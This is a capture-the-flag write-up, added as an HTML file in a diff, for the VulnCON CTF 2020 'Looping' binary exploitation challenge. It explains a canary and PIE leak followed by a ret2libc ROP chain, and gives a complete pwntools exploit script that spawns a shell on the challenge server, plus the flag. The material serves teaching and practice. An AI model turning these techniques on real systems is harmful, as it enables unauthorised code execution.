@@ -1,0 +1,78 @@
+<!--Solve date: 12/19/2020-->
+
+<h1>VulnCON CTF 2020 - Looping</h1>
+
+<h2>Binary Exploitation - 340 pts</h2>
+
+<h3>Writeup by YR81</h3>
+
+<h4>Discussion</h4>
+
+<h5>Program Behavior</h5>
+
+<p>The program is a Position-Independent Executable (PIE); that is, the absolute location of the text is randomized. Furthermore, there is a stack canary. (Recall that the value of this canary is randomized and is checked just before the function returns.) Nonetheless, there is a buffer overflow vulnerability that will allow for arbitrary code execution.</p>
+
+<img class = "small" src = "./images/vulncon_looping_1.png"/>
+
+<p class = "caption">Figure 1. Buffer overflow vulnerability in <code>main()</code>.</p>
+
+<p>In <code>main()</code>, we get to write to a stack buffer twice, and after each time, that buffer is printed with <code>puts()</code>. After the two runs, the canary is checked; if its value was unmodified, we return; otherwise, the process is killed.</p>
+
+<h5>Obtaining Leaks and ROP</h5>
+
+<p>To get reliable arbitrary code execution, we need to learn the value of the canary as well as get the text offset (to overcome PIE). We can kill these two birds (hopefully not canaries :)) with one stone by writing our buffer <i>up to the point</i> where the canary starts, since it turns out that the saved frame pointer (one qword above the canary) points to <code>init()</code>, a function in the text. Since the LSB of canaries on x64 is null, we will write one byte beyond the end of the buffer (otherwise, the null LSB of the canary would terminate the buffer string and neither piece of information will be leaked). Subtracting the offset of <code>init()</code> will give us the text base.</p>
+
+<p>After leaking the canary and text, on the next write, we will write the value of the canary (with the null LSB). Since we are looking to obtain a shell, we also need to leak the address of libc and return to <code>main()</code> so that we can deliver a final payload to spawn the shell. With PIE defeated through the initial leak, this becomes a very standard ROP / ret2libc exploit.</p>
+
+<h4>Payload</h4>
+
+<pre class = "python">
+
+from pwn import *
+
+ready = True
+
+if ready:
+    p = remote("35.232.11.215", 49154)
+    libc = ELF("./libc.so.6")
+else:
+    p = process("./looping")
+    libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
+    context.terminal = ["/mnt/c/Users/********/wsl-terminal/open-wsl.exe", '-e']
+    gdb.attach(p)
+
+def pad0(b, n):
+    if len(b) >= n:
+        return b[: n]
+
+    return b + (n - len(b)) * b'\x00'
+
+init_offs = 0x990
+poprdi_ret_offs = 0x9f3
+puts_plt_offs = 0x710
+puts_got_offs = 0x200fa8
+main_offs = 0x88a
+ret_offs = 0x980
+
+p.send(0x49 * b'\x01')
+goods = p.recvline()[0x49: -1]      #disregard our entry, and chop off terminator
+CANARY = u64(pad0(b'\x00' + goods[: 7], 8))
+log.info("Leaked canary: %s" % (hex(CANARY)))
+
+textBase = u64(pad0(goods[7: ], 8)) - init_offs
+log.info("Leaked text offset: %s" % (hex(textBase)))
+p.send(0x48 * b'\x01' + p64(CANARY) + p64(0xdeadbeef) + p64(textBase + poprdi_ret_offs) + p64(textBase + puts_got_offs) + p64(textBase + puts_plt_offs) + p64(textBase + main_offs))
+
+p.recvuntil("Harder\n")
+libc.address = u64(pad0(p.recvline()[: -1], 8)) - libc.sym["puts"]
+log.info("Libc base address: %s" % hex(libc.address))
+
+p.send(b'hi')
+p.send(0x48 * b'\x01' + p64(CANARY) + p64(0xdeadbeef) + p64(textBase + ret_offs) + p64(textBase + poprdi_ret_offs) + p64(next(libc.search(b"/bin/sh"))) + p64(libc.sym["system"]))
+
+p.interactive()    
+</pre>
+
+<h4>Flag</h4>
+
+<p><code>vulncon{w3_d0n7_c4r3_4b0u7_c4n4r13s}</code></p>
